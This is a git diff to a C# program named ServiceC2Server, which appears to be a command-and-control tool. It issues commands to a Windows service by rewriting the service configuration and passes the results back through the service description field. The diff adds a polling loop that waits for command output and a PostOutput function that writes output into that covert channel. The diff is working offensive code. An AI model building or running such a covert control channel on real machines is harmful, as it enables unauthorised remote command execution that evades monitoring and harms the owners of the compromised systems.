@@ -38,7 +38,7 @@ namespace ServiceC2Server
         public static extern bool QueryServiceConfigA(IntPtr hService, IntPtr lpServiceConfig, UInt32 cbBufSize, out UInt32 pcbBytesNeeded);
 
         [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
-        public static extern Boolean QueryServiceConfig2A(IntPtr hService, UInt32 dwInfoLevel, IntPtr buffer, UInt32 cbBufSize, out UInt32 pcbBytesNeeded);
+        public static extern bool QueryServiceConfig2A(IntPtr hService, UInt32 dwInfoLevel, IntPtr buffer, UInt32 cbBufSize, out UInt32 pcbBytesNeeded);
 
         [DllImport("kernel32.dll")]
         static extern uint GetLastError();
@@ -151,29 +151,35 @@ namespace ServiceC2Server
 
         }
 
-        public static void ReadOutput(string serviceName)
+        public static string ReadOutput(string serviceName)
         {
             Console.WriteLine("Waiting for output from " + serviceName);
-
+            string output = "Error";
+            
             IntPtr schService = Connect(serviceName);
 
             IntPtr buffer = IntPtr.Zero;
             uint dwBytesNeeded = 0;
-
+            
             bool result = QueryServiceConfig2A(schService, 1, IntPtr.Zero, dwBytesNeeded, out dwBytesNeeded);
             IntPtr ptr = Marshal.AllocHGlobal((int)dwBytesNeeded);
             result = QueryServiceConfig2A(schService, 1, ptr, dwBytesNeeded, out dwBytesNeeded);
+            
 
-            SERVICE_DESCRIPTION service_description = new SERVICE_DESCRIPTION();
-            Console.WriteLine(result);
+
             if (result)
             {
-                service_description = (SERVICE_DESCRIPTION)Marshal.PtrToStructure(ptr, new SERVICE_DESCRIPTION().GetType());
-                string cmd = service_description.lpDescription;
-                Console.WriteLine("Output: " + cmd);
-            }
-            Marshal.FreeHGlobal(ptr);
+                SERVICE_DESCRIPTION service_description = new SERVICE_DESCRIPTION();
+                Console.WriteLine(ptr.ToString());
 
+                Marshal.PtrToStructure(ptr, service_description);
+
+                output = service_description.lpDescription;
+                Console.WriteLine("Output: " + output);
+            }
+            
+            Marshal.FreeHGlobal(ptr); 
+            return output;
         }
 
         public static void UpdateCommand(string serviceName, string input)
@@ -191,9 +197,46 @@ namespace ServiceC2Server
             Console.WriteLine("\t[+] ChangeServiceConfigA [OK]");
 
             Console.WriteLine("[+] Cmd updated to: {0}", newCmd);
-
-            ReadOutput(serviceName);
+            
+            while (true)
+            {
+                string output = ReadOutput(serviceName); 
+                if (output.Length > 0)
+                {
+                    Console.WriteLine("Got output: " + output);
+                    break;
+                }
+            }
         }
+
+        public static bool PostOutput(string host, string serviceName, string output)
+        {
+
+            IntPtr schService = Connect(serviceName);
+
+            SERVICE_DESCRIPTION service_descriptiona = new SERVICE_DESCRIPTION();
+
+            service_descriptiona.lpDescription = output;
+            IntPtr sdinfo = Marshal.AllocHGlobal(Marshal.SizeOf(service_descriptiona));
+            if (sdinfo == IntPtr.Zero)
+            {
+                Console.WriteLine("[-] Failed marshalling");
+
+            }
+
+            Marshal.StructureToPtr(service_descriptiona, sdinfo, false);
+            bool success = ChangeServiceConfig2(schService, 1, sdinfo);
+
+            if (!success)
+            {
+                Console.WriteLine("[-] Output update failed");
+            }
+            Console.WriteLine("[+] Output updated successfully");
+
+            return success;
+        }
+
+
 
 
         static void Main(string[] args)
